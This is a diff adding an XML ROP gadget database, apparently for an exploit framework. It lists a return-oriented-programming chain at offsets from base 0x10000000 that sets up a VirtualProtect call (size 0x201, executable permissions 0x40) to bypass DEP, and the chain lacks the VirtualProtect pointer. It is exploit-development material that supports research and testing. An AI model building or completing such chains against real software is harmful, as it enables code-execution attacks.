@@ -1,0 +1,34 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<db>
+<rop>
+  <compatibility>
+    <target>-1.0-</target>
+  </compatibility>
+
+  <gadgets base="0x10000000">
+    <gadget offset="0x00141ba1">pop ebp # retn </gadget>
+    <gadget offset="0x00141ba1">skip 4 bytes </gadget>
+    <gadget offset="0x000cb2ce">pop eax # retn </gadget>
+    <gadget value="0xfffffdff">Value to negate, will become 0x00000201</gadget>
+    <gadget offset="0x0007b5d6">neg eax # retn </gadget>
+    <gadget offset="0x000639e1">push eax # add al,5dh # mov eax,1 # pop ebx # add esp,7210h # retn 0x08 </gadget>
+    <gadget value="junk">Filler</gadget>
+    <gadget offset="0x0002f729">pop eax # retn </gadget>
+    <gadget value="junk">Filler</gadget>
+    <gadget value="0xffffffc0">Value to negate, will become 0x00000040</gadget>
+    <gadget offset="0x000e467d">neg eax # retn </gadget>
+    <gadget offset="0x000cb4d4">xchg eax,edx # retn </gadget>
+    <gadget offset="0x0005a46e">pop ecx # retn </gadget>
+    <gadget offset="0x0020cc3e">Writable location </gadget>
+    <gadget offset="0x0012e6de">pop edi # retn </gadget>
+    <gadget offset="0x0005a3e8">retn (rop nop) </gadget>
+    <gadget offset="0x0014de69">pop esi # retn </gadget>
+    <gadget offset="0x0013efc6">jmp [eax] </gadget>
+    <gadget offset="0x0002f729">pop eax # retn </gadget>
+    <gadget value="0x00000000">[-] Unable to find ptr to VirtualProtect()</gadget>
+    <gadget value="junk">Filler</gadget>
+    <gadget offset="0x0014f447">pushad # retn </gadget>
+    <gadget offset="0x000bb515">ptr to 'push esp # ret ' </gadget>
+  </gadgets>
+</rop>
+</db>
